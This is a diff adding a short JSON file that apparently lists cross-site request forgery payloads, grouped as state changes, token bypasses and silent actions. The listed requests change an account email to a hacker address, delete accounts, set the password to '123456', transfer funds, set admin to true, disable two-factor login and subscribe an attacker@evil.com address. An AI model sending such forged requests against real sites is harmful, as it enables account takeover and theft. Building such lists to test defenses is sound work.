@@ -1,0 +1,17 @@
+{
+  "StateChange": [
+    "/change_email?email=hacker@example.com",
+    "/delete_account",
+    "/update_password?new=123456"
+  ],
+  "TokenBypass": [
+    "/transfer?amount=1000",
+    "/settings?admin=true",
+    "/enable_2fa?status=off"
+  ],
+  "SilentActions": [
+    "/subscribe_newsletter?email=attacker@evil.com",
+    "/vote_poll?option=3",
+    "/like_post?id=42"
+  ]
+}
